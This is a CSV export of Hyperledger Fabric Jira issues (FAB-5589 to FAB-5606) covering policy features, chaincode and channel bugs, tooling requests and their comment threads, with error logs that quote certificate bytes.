It will be good to provide tooling support to simplify this task.

The same goes for update time as well where it will be good to provide tooling to generate config update to be submitted to RSCC.",,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybpz:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Dec/18 4:56 AM;mastersingh24;ACLs are now part of configtx.yaml;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create explicit meta policy type,FAB-5589,19905,,Story,To Do,FAB,Fabric,software,denyeart,,,Medium,,,jyellick,jyellick,03/Aug/17 3:04 AM,17/Apr/21 4:21 AM,28/Oct/23 3:00 AM,,,,,Future,,fabric-orderer,,,,,,0,common-components,configuration,ipm,,,,"The policy framework currently supports the notion of an implicit meta policy.  IE, a policy which evaluates sub-policies and based on some rule, returns a policy result of its own.

These are extremely useful for default policies, as it can express things like ""Any user who's cert satisfies their own org's Reader's policy may read"".

The 'impliict' part of the implicit meta policy has one notable limitation.  It is only possible to make a rule based on the sub-policies of all sub-groups, not of some subset.

To address this deficiency, and make the policy framework more powerful, an explicit meta policy type should be introduced.  It should act like the implicit meta policy, referencing sub-policies, but it should be able to restrict the subset of groups to an explicit set.  Ideally, it should re-use the cauthdsl framework so that the explicit policy rules may be arbitrarily powerful.",,denyeart,jyellick,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|i00n2e:ai",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,jyellick,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Sep/17 10:51 AM;kchristidis;Suggest to defer to 1.2 as this doesn't address a pressing need?;;;","08/Sep/17 12:25 AM;jyellick;Agreed, its tag as v1.1 is an oversight.;;;","08/Mar/18 12:05 AM;kchristidis;[~jyellick] 1.2 still good or defer to backlog for now? Feel free to edit accordingly.;;;","23/Mar/18 2:07 PM;denyeart;Many issues were bulk moved from v1.0 or v1.1 to v1.2 as part of a cleanup effort, and many of these issues are not high priority or actually intended to be worked for v1.2.  This issue is being bulk moved to Future.  If the issue is indeed high priority for v1.2 and/or very low effort, please move back to v1.2 and add a comment to indicate rationale.;;;","17/Apr/21 4:21 AM;jyellick;Despite its long languishing status, I still think this would be a good feature to implement.  Not closing for the moment, though there's no obvious timeline for its implementation.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Create a ""transient"" field in config for initializing RSCC on join",FAB-5590,19908,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,muralisr,muralisr,03/Aug/17 3:45 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Aug/17 10:30 PM,,,,,,fabric-peer,,,,,,0,,,,,,,"The RSCC config tree needs to be specified at channel creation and passed on the peers at Join time. This task is for implementing how the config transported on the channel configuration.

From [~jyellick] 

{code:java}
It is ""transient"" because it appears only in the _next_ config block. If the system is reconfigured, the data will not appear in the config due to the reconfiguration. IE, there is no need to keep the RSCC seed data around for the later config blocks, because it would be out of date, because it may be modified by normal endorser transactions
{code}
",,jyellick,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5584,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybqf:",,,,,,,,,,,,,,,,,,,,,,,jyellick,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Aug/17 1:55 AM;jyellick;This scope of this work is slightly larger than creating simple a transient field.  Since the Config type is being overloaded, other proto changes such as specifying type are needed, so the scope of this task is being enlarged.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
failed to send invokes after instantiating the chaincode on a channel,FAB-5591,19910,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,cbl,suryalnvs,suryalnvs,03/Aug/17 6:49 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,25/Oct/17 3:53 PM,,,,,,fabric-peer,,,,,,0,chaincode,peer,quality,,,,"After instantiating the chaincode on a channel, failing to send invokes to the peer on that channel.

Tested on August 2, 2017 using:

*commit* 2cab745abf031d8ff5d3e8f4fa7a5e5af8907fad
 *Date:*   Sun Jul 30 08:40:19 2017 -0400

*Steps:*
 # Launched the network with 3 orderers, 5 kafka brokers, 3 zookeepers, 6 organizations with 2 peers each, 1 ca for each organization
 # Created 30 channels, joined org1, org2 to first 10 channels, joined org3, org4 to second 10 channels, joined org5, org6 to last 10 channels
 # Used PTE to install sample_cc_ch12:v0 chaincode on org1, org2 peers. Similary sample_cc_ch34:v0 on org3, org4 peers and sample_cc_ch56:v0 on org5, org6 peers
 # Instantiated on channel12-0, channel34-0, channel56-0 using PTE and saw chaincode containers running after some time.
 # Tried to send invokes to peer0 of org1 and org2 which were failed saying
{code:java}
18:35:54.018 UTC [lscc] Invoke -> ERRO 27cf^[[0m error getting chaincode sample_cc_ch12 on channel: mychannel12-0(err:could not find chaincode with name 'sample_cc_ch12') {code}

 

*Note:* I noticed building chaincode image took quite a long time (around 9 minutes). 
{code:java}
 [36m2017-08-02 18:22:25.497 UTC [util] DockerBuild -> DEBU 1722^[[0m Attempting build with image hyperledger/fabric-ccenv:x86_64-1.0.1-snapshot-2cab745
^[[36m2017-08-02 18:31:37.698 UTC [dockercontroller] deployImage -> DEBU 1723^[[0m Created image: dev-peer0.org1.example.com-sample_cc_ch12-v0-2bee90c54732ea5204cee1b7e2fddab81a42dc12e34affc0aa2e4f3af8c4ca6f {code}",,cbl,muralisr,scottz,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybqv:",,,,,,,,,,,,,,,,,,,,,,,cbl,muralisr,scottz,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Aug/17 11:57 PM;scottz;Initial investigations revealed:
 # traffic tool PTE timed out after waiting 2 minutes for the instantiation, and then could not send invokes. PTE does not wait 10 minutes. If we increased PTE timeout value, it should work.
 # We suspect a bad wireless network and/or resource issue on the tester's laptop. Same test passed another day on same machine.
 # In the failing test, the logs indicated that the chaincode container was successfully started eventually - after 9 minutes.
 # core.yaml config parameter CORE_CHAINCODE_STARTUPTIMEOUT=300s (as shown in the text box below), but the peer did not report an error 5 minutes after receiving the instantiation request. This was suspicious. Murali confirmned that this timer covers only the startup phase - and does not include building the chaincode image, which can also occur (first) when receiving the instantiation request. he suggested revisiting this timer, to ensure it is started before trying to build the image, so that the timer is all-encompassing and it would make more sense from the user's perspective to represent the time from beginning to end of the instantiation request msg. As written in core.yaml comments (below), one might argue that it is technically accurate `...for starting up a container...` but as discussed previously it is not a user-friendly definition when the image must also be built. We propose to change the code to start the timer earlier, to encompass the time for building an image, and optionally reword this comment too.

{noformat}
# Timeout duration for starting up a container and waiting for Register
# to come through. 1sec should be plenty for chaincode unit tests
  startuptimeout: 300s{noformat};;;","25/Sep/17 10:20 PM;muralisr;[~cbl] thanks for taking a look at this! Let me know if you need pointers.;;;","13/Oct/17 11:51 AM;cbl;Working on that:

https://gerrit.hyperledger.org/r/#/c/13835/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"cryptogen use Country,Province,Locality and OrganizationalUnit and so on",FAB-5592,19914,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,liuwenliang0632,liuwenliang0632,liuwenliang0632,03/Aug/17 6:22 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,19/Jun/18 7:42 AM,v1.0.0,,,v1.1.0,,fabric-tools,,,,,,0,candidate,,,,,,"i want to add some properties of ca to generate pem,the config will show 
{code:java}
PeerOrgs:
  - Name: Org1
    Domain: org1.example.com
    CA:
        Country: US
        Province: California
        Locality: San Francisco
    #   OrganizationalUnit: Hyperledger Fabric
    #   StreetAddress: address for org # default nil
    #   PostalCode: postalCode for org # default nil
{code}

",,JonathanLevi,liuwenliang0632,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzybrr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,JonathanLevi,liuwenliang0632,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Aug/17 11:47 AM;liuwenliang0632;https://gerrit.hyperledger.org/r/#/c/12123/;;;","28/Aug/17 8:31 PM;mastersingh24;1.1 candidate;;;","29/Aug/17 3:15 AM;JonathanLevi;[~liuwenliang0632]: That's awesome. Yes, we should not have ignored these fields, and I like the tests. Thank you.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement a light client for Fabric ,FAB-5593,19915,,Epic,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,elli-androulaki,elli-androulaki,03/Aug/17 8:26 PM,23/Jan/20 6:58 AM,28/Oct/23 3:00 AM,23/Jan/20 6:58 AM,,,,Future,,fabric-crypto,fabric-sdk-go,,,,,0,stale-item,,,,,,Client (or a version of a peer) can register to only receive transactions that refer to specific chaincodes or parts of the state of the ledger (as long as they are entitled access to it).,,elli-androulaki,grapebaba,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,Unset,ghx-label-1,,Fabric Light Client,To Do,,,Unset,,,,"1|hzybrz:",,,,Unset,Unset,,,,,,,,,,,,,,,,,,elli-androulaki,grapebaba,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 6:58 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
As an infrastructure developer i want to enhance my transactions with updated epoch numbers,FAB-5594,19916,12885,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,elli-androulaki,elli-androulaki,03/Aug/17 8:29 PM,30/Jul/19 12:52 PM,28/Oct/23 3:00 AM,30/Jul/19 12:52 PM,,,,Future,,fabric-crypto,fabric-orderer,fabric-peer,,,,0,,,,,,,"This can serve two purposes:

 - efficient (more light weight) replay attack protection

 - clear boundary w.r.t. when a transaction should no longer be expected to appear in a channel. This can be handy for many applications not to forever wait for their transaction to appear in the ledger.",,ChristopherFerris,elli-androulaki,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,Unset,Unset,,,,,,,Unset,,,,"1|hzybs7:",,,,Unset,Unset,Sprint 6 - consensus,Sprint 9 - Crypto,Sprint 10 - Crypto,Sprint 11 - Crypto,,,Unset,,,,,,,,,,,ChristopherFerris,elli-androulaki,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Jul/18 9:44 PM;ChristopherFerris;[~elli-androulaki] is this still needed?;;;","30/Jul/19 12:52 PM;mastersingh24;Can be reopened or recreated if needed but does not seem like we'll need to do this anymore;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE supports query blockchain information with large number of blocks,FAB-5596,19924,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sunhwei,dongming,dongming,03/Aug/17 11:30 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,15/May/18 4:33 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"When query blockchain information, PTE queries the number of transactions contained in a block.  When the number of blocks become large (more than 150), the query will fail because of timeout.",,dongming,sunhwei,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Nov/17 7:36 PM;sunhwei;image-2017-11-16-18-36-56-642.png;https://jira.hyperledger.org/secure/attachment/13346/image-2017-11-16-18-36-56-642.png",,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzybt3:",,,,,,,,,,,,,,,,,,,,,,,dongming,sunhwei,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Nov/17 7:40 PM;sunhwei; It caused by PEER node performance , the QSCC chaincode performance can not process burst query request, 

Suggest to open a performance issue to QSCC. 

below is the peer log ,it show the timeout occured during our test large number block  query.

!image-2017-11-16-18-36-56-642.png!;;;","21/Nov/17 4:43 AM;dongming;Though QSCC cannot process burst queries request, can PTE provide workaround to support this?  For example, a loop with x queries a time.;;;","15/May/18 4:33 AM;dongming;tested with latest fabric and works well with large number, e.g., 7000 blocks, with fabric 1.1.0-rc1

close for now, reopen if see any issue;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add FilteredBlock events to block listener sample,FAB-5599,19927,19504,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,wlahti,wlahti,04/Aug/17 12:07 AM,26/Sep/19 4:09 PM,28/Oct/23 3:00 AM,08/Dec/17 10:49 PM,,,,Abandoned,,fabric-samples,,,,,,0,,,,,,,,,C0rWin,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybtr:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Jan/18 1:06 AM;C0rWin;https://gerrit.hyperledger.org/r/#/c/16919/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Example chaincode of getHistoryForKey() function,FAB-5601,19929,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Invalid,dsanchezseco,dsanchezseco,dsanchezseco,04/Aug/17 2:47 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,20/Jul/18 11:05 PM,v1.0.2,,,,,fabric-samples,,,,,,1,getting-started,,,,,,"It would be nice to have an example contract as chain code_example02 showcasing the new function getHistoryForKey() returning all the values over the time for a key.

These will give a more accurate vision of the functionality.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,7200,3600,,0%,7200,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-2276,,,,,,,,,"1|hzybu7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable the ability to specify the filename of the block generated by the peer channel create command,FAB-5602,19930,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,sanchezl,sanchezl,04/Aug/17 3:04 AM,21/Jul/18 3:48 AM,28/Oct/23 3:00 AM,17/May/18 4:10 AM,,,,v1.2.0,,fabric-peer,,,,,,0,,,,,,,"Enable the ability to specify the filename of the block generated by the {{peer channel create}} command

Currently, there is no option to specify the location or name of the generated genesis block when running the  {{peer channel create}} command. Instead, the block is simply generated in the current working directory and named {{$CHANNEL_ID.block.}}.

It would be useful when writing scripts if the block output file name could be specified. For example, I might want it generated into a temporary directory.",,denyeart,K.Fukuch,latitiah,sanchezl,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-10144,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzybuf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,K.Fukuch,latitiah,sanchezl,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Mar/18 2:07 PM;denyeart;Many issues were bulk moved from v1.0 or v1.1 to v1.2 as part of a cleanup effort, and many of these issues are not high priority or actually intended to be worked for v1.2.  This issue is being bulk moved to Future.  If the issue is indeed high priority for v1.2 and/or very low effort, please move back to v1.2 and add a comment to indicate rationale.;;;","15/May/18 10:40 PM;sykesm;The inability to specify where to place the genesis block is impacting the ginkgo style e2e tests. When we create the channel, the block file gets dropped into the current directory instead of the test state directory.

Instead of adding a bunch of cleanup code to the tests, I think it's better to simply address the root cause.;;;","15/May/18 10:53 PM;sykesm;[~mastersingh24] - Looking for direction on flag name or argument and requested in in [https://gerrit.hyperledger.org/r/c/21813/];;;","16/May/18 11:51 PM;sykesm;Per discussion with [~mastersingh24], the flag name shall be: outputBlock.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Forgotten f on switch definition on byfn.sh script,FAB-5603,19931,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dsanchezseco,dsanchezseco,dsanchezseco,04/Aug/17 3:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Nov/17 1:19 PM,v1.0.2,,,,,fabric-samples,,,,,,0,,,,,,,With all the code merge I forgot to add the option f on the switch of the script,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,0,,0%,0,0,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5576,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2276,,,,,,,,,"1|hzybun:",,,,,,,,,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Nov/17 1:20 PM;denyeart;https://gerrit.hyperledger.org/r/#/c/12131/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove all traces of testchainid,FAB-5604,19932,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,aambati,sanchezl,sanchezl,04/Aug/17 3:17 AM,08/Jan/19 4:47 AM,28/Oct/23 3:00 AM,26/Nov/17 10:44 PM,,,,v1.1.0,,fabric-peer,,,,,,1,candidate,help-wanted,,,,,"There are still some remnants of the default channel named {{testchainid}} in the code. We should find and remove them as to clarify that we really did mean to remove it.

For example:
 * {{peer start}} command still describes a {{-peerDefaultChain}} option, but it does nothing in the code.
 * Various {{peer chaincode}} commands such as {{peer chaincode invoke}} and {{peer chaincode instantiate}} default to a {{-C/-channelID}} parameter value of {{testchainid}} and should instead make the {{-C/-channelID}} parameter a required parameter.",,aambati,jeffgarratt,muralisr,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-12813,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzybuv:",,,,,,,,,,,,,,,,,,,,,,,aambati,jeffgarratt,muralisr,sanchezl,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Oct/17 4:27 AM;jeffgarratt;[~muralisr] any thoughts on this one?;;;","27/Oct/17 5:37 AM;muralisr;[~jeffgarratt] I think the proposal is reasonable ... but there is no compatibility issue, would be ok to postpone too. Perhaps we should make this help-wanted (and you or I can help an interested new contributor) ?;;;","01/Nov/17 11:42 PM;jeffgarratt;Perhaps look at this [~aambati]?;;;","04/Nov/17 3:26 AM;aambati;https://gerrit.hyperledger.org/r/c/15169/;;;","04/Nov/17 10:54 AM;jeffgarratt;[~aambati] I could not find the above CR?  Is it correct?;;;","07/Nov/17 1:31 AM;aambati;[~jeffgarratt] yes that is correct. Probably you are using old UI, if so, pls use this link:



https://gerrit.hyperledger.org/r/#/c/15169/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
We need to be able to tell the health of the orderer,FAB-5605,19933,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Duplicate,,g8rfrk,g8rfrk,04/Aug/17 4:41 AM,19/Nov/18 2:22 PM,28/Oct/23 3:00 AM,19/Nov/18 2:22 PM,,,,v1.4.0,,,,,,,,1,HSBN,Serviceability,,,,,"We need to be able to tell the health of the orderer and everything it controls, including Kafka

 

We must have this for the update process.",,g8rfrk,mplisov,smartheye,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-12359,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-10851,,,,,,,,,"1|hzybv3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,g8rfrk,mplisov,smartheye,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Submitting invalid admin cert on system channel causes new channel creation to fail,FAB-5606,19937,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,jyellick,varadatibm,varadatibm,04/Aug/17 5:45 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,05/Aug/17 2:56 AM,v1.0.0,v1.0.1,,v1.0.1,v1.1.0,fabric-orderer,,,,,,0,HSBN,,,,,,"Submitting invalid admin cert causes new channel creation to fail

Steps:
 # Create a new channel - Success
 # Get cert from CA
 # Submit a _valid_ public cert to add to system channel - Success
 # Create a new channel - Success
 # Submit a _invalid_ public cert to add to system channel - Failure from UI
 # Create a new channel - Failure

Update system channel fails with the following error

[33m2017-08-03 18:34:16.863 UTC [orderer/common/broadcast] Handle -> WARN 094�[0m Rejecting CONFIG_UPDATE because: Error processing updated config: Setting up the MSP manager failed, err getIdentityFromBytes error: could not decode pem bytes [[45 45 45 45 45 66 69 71 73 78 32 67 69 82 84 73 70 73 67 65 84 69 45 45 45 45 45 10 77 73 73 67 65 68 67 67 65 97 101 103 65 119 73 66 65 103 73 85 83 109 111 80 75 72 97 69 75 53 90 121 81 82 67 78 122 111 56 49 55 107 113 84 82 82 48 119 67 103 89 73 75 111 90 73 122 106 48 69 65 119 73 119 10 71 122 69 90 77 66 99 71 65 49 85 69 65 120 77 81 89 87 82 116 97 87 53 81 90 87 86 121 84 51 74 110 77 107 78 66 77 84 65 101 70 119 48 120 78 122 65 52 77 68 73 121 77 68 65 52 77 68 66 97 70 119 48 120 10 79 68 65 52 77 68 73 121 77 68 65 52 77 68 66 97 77 70 48 120 67 122 65 74 66 103 78 86 66 65 89 84 65 108 86 84 77 82 99 119 70 81 89 68 86 81 81 73 69 119 53 79 98 51 74 48 97 67 66 68 89 88 74 118 10 98 71 108 117 89 84 69 85 77 66 73 71 65 49 85 69 67 104 77 76 83 72 108 119 90 88 74 115 90 87 82 110 90 88 73 120 68 122 65 78 66 103 78 86 66 65 115 84 66 107 90 104 89 110 74 112 89 122 69 79 77 65 119 71 10 65 49 85 69 65 120 77 70 89 87 82 116 97 87 52 119 87 84 65 84 66 103 99 113 104 107 106 79 80 81 73 66 66 103 103 113 104 107 106 79 80 81 77 66 66 119 78 67 65 65 82 115 72 116 89 48 54 77 80 103 101 111 99 97 10 120 112 114 87 90 116 120 75 77 67 55 90 53 55 110 105 47 120 55 118 51 77 74 111 55 53 65 67 66 103 74 89 111 51 90 71 49 88 116 97 100 102 108 114 114 77 70 74 49 99 72 73 89 71 122 71 82 77 74 107 99 89 105 74 10 99 102 122 52 78 113 118 107 111 52 71 71 77 73 71 68 77 65 52 71 65 49 85 100 68 119 69 66 47 119 81 69 65 119 73 67 66 68 65 77 66 103 78 86 72 82 77 66 65 102 56 69 65 106 65 65 77 66 48 71 65 49 85 100 10 68 103 81 87 66 66 84 120 115 43 56 85 48 115 78 106 69 56 55 52 49 90 70 114 103 86 57 109 115 104 75 69 50 84 65 102 66 103 78 86 72 83 77 69 71 68 65 87 103 66 81 71 89 77 65 81 49 75 48 111 57 108 117 74 10 69 88 75 69 121 88 69 66 86 108 84 117 51 84 65 106 66 103 78 86 72 82 69 69 72 68 65 97 103 104 104 50 89 88 74 104 90 71 49 104 89 121 53 121 89 87 120 108 97 87 100 111 76 109 108 105 98 83 53 106 98 50 48 119 10 67 103 89 73 75 111 90 73 122 106 48 69 65 119 73 68 82 119 65 119 82 65 73 103 79 51 73 52 52 113 110 76 54 113 43 83 83 86 108 97 65 53 105 121 89 83 70 100 51 121 68 84 55 87 78 67 88 88 90 78 106 76 121 109 10 85 49 115 67 73 72 52 100 118 98 52 105 98 119 73 83 83 109 115 108 74 105 82 55 55 101 118 101 82 119 115 70 49 55 99 100 56 65 108 98 49 90 80 51 119 78 106 84 49 10 45 45 45 45 45 69 78 68 32 67 69 82 84 73 70 73 67 65 84 69 45 45 45 45 45]]

Create channel fails with the following error

�[33m2017-08-03 18:35:52.358 UTC [orderer/common/broadcast] Handle -> WARN 095�[0m Rejecting CONFIG_UPDATE because: Setting up the MSP manager failed, err getIdentityFromBytes error: could not decode pem bytes [[45 45 45 45 45 66 69 71 73 78 32 67 69 82 84 73 70 73 67 65 84 69 45 45 45 45 45 10 77 73 73 67 65 68 67 67 65 97 101 103 65 119 73 66 65 103 73 85 83 109 111 80 75 72 97 69 75 53 90 121 81 82 67 78 122 111 56 49 55 107 113 84 82 82 48 119 67 103 89 73 75 111 90 73 122 106 48 69 65 119 73 119 10 71 122 69 90 77 66 99 71 65 49 85 69 65 120 77 81 89 87 82 116 97 87 53 81 90 87 86 121 84 51 74 110 77 107 78 66 77 84 65 101 70 119 48 120 78 122 65 52 77 68 73 121 77 68 65 52 77 68 66 97 70 119 48 120 10 79 68 65 52 77 68 73 121 77 68 65 52 77 68 66 97 77 70 48 120 67 122 65 74 66 103 78 86 66 65 89 84 65 108 86 84 77 82 99 119 70 81 89 68 86 81 81 73 69 119 53 79 98 51 74 48 97 67 66 68 89 88 74 118 10 98 71 108 117 89 84 69 85 77 66 73 71 65 49 85 69 67 104 77 76 83 72 108 119 90 88 74 115 90 87 82 110 90 88 73 120 68 122 65 78 66 103 78 86 66 65 115 84 66 107 90 104 89 110 74 112 89 122 69 79 77 65 119 71 10 65 49 85 69 65 120 77 70 89 87 82 116 97 87 52 119 87 84 65 84 66 103 99 113 104 107 106 79 80 81 73 66 66 103 103 113 104 107 106 79 80 81 77 66 66 119 78 67 65 65 82 115 72 116 89 48 54 77 80 103 101 111 99 97 10 120 112 114 87 90 116 120 75 77 67 55 90 53 55 110 105 47 120 55 118 51 77 74 111 55 53 65 67 66 103 74 89 111 51 90 71 49 88 116 97 100 102 108 114 114 77 70 74 49 99 72 73 89 71 122 71 82 77 74 107 99 89 105 74 10 99 102 122 52 78 113 118 107 111 